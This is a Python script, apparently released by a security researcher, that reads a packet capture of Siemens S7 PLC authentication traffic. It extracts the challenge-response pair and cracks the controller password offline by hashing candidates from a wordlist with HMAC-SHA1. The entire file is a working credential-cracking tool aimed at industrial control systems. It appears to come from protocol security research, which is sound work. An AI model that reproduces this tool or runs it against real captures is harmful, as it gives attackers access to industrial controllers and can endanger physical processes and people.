#!/usr/bin/env python

"""
File: s7_brute_offline.py
Desc: Offline password bruteforse based on challenge-response data, 
      extracted from auth traffic dump file.
"""

__author__ = "Aleksandr Timorin"
__copyright__ = "Copyright 2013, Positive Technologies"
__license__ = "GNU GPL v3"
__version__ = "1.1"
__maintainer__ = "Aleksandr Timorin"
__email__ = "atimorin@gmail.com"
__status__ = "Development"

import sys
import hashlib
import hmac
import optparse
from binascii import hexlify
try:
    from scapy.all import *
except ImportError:
    print "please install scapy: http://www.secdev.org/projects/scapy/ "
    sys.exit()


def get_challenge_response(pcap_file):
    r = rdpcap(pcap_file)

    lens = map(lambda x: x.len, r)
    pckt_lens = dict([(i, lens[i]) for i in range(0,len(lens))])

    # try to find challenge packet
    pckt_108 = 0 #challenge packet (from server)
    for (pckt_indx, pckt_len) in pckt_lens.items():
        if pckt_len+14 == 108 and hexlify(r[pckt_indx].load)[14:24] == '7202002732':
            pckt_108 = pckt_indx
            break

    # try to find response packet
    pckt_141 = 0 #response packet (from client)
    _t1 = dict([ (i, lens[i]) for i in pckt_lens.keys()[pckt_108:] ])
    for pckt_indx in sorted(_t1.keys()):
        pckt_len = _t1[pckt_indx]
        if pckt_len+14 == 141 and hexlify(r[pckt_indx].load)[14:24] == '7202004831':
            pckt_141 = pckt_indx
            break

    # try to find auth result packet
    pckt_84 = 0 # auth answer from plc: pckt_len==84 -> auth ok
    pckt_92 = 0 # auth answer from plc: pckt_len==92 -> auth bad
    for pckt_indx in sorted(_t1.keys()):
        pckt_len = _t1[pckt_indx]
        if pckt_len+14 == 84 and hexlify(r[pckt_indx].load)[14:24] == '7202000f32':
            pckt_84 = pckt_indx
            break
        if pckt_len+14 == 92 and hexlify(r[pckt_indx].load)[14:24] == '7202001732':
            pckt_92 = pckt_indx
            break

    print "found packet indeces: pckt_108=%d, pckt_141=%d, pckt_84=%d, pckt_92=%d" % (pckt_108, pckt_141, pckt_84, pckt_92)
    if pckt_84:
        print "auth ok"
    else:
        print "auth bad. for brute we need right auth result. exit"
        sys.exit()

    challenge = None
    response = None

    raw_challenge = hexlify(r[pckt_108].load)
    if raw_challenge[46:52] == '100214' and raw_challenge[92:94] == '00':
        challenge = raw_challenge[52:92]
        print "found challenge: %s" % challenge
    else:
        print "cannot find challenge. exit"
        sys.exit()

    raw_response = hexlify(r[pckt_141].load)
    if raw_response[64:70] == '100214' and raw_response[110:112] == '00':
        response = raw_response[70:110]
        print "found  response: %s" % response
    else:
        print "cannot find response. exit"
        sys.exit()

    return challenge, response

def calculate_s7response(password, challenge):
    challenge = challenge.decode("hex")
    return hmac.new( hashlib.sha1(password).digest(), challenge, hashlib.sha1).hexdigest()

if __name__ == '__main__':
    parser = optparse.OptionParser()
    parser.add_option('-p', '--pcap', dest="pcap_file", help="traffic dump file")
    parser.add_option('-w', '--wordlist', dest="wordlist_file", help="wordlist file")
    options, args = parser.parse_args()
    
    pcap_file = options.pcap_file
    wordlist_file = options.wordlist_file
    if not pcap_file or not wordlist_file:
        parser.print_help()
        sys.exit()

    
    print "using pcap file: %s , wordlist file: %s" % (pcap_file, wordlist_file)
    challenge, response = get_challenge_response(pcap_file)
    print "start password bruteforsing  ..."
    for p in open(wordlist_file):
        p = p.strip()
        if response == calculate_s7response(p, challenge):
            print "found password: %s" % p
            sys.exit()
    print "password not found. try another wordlist."




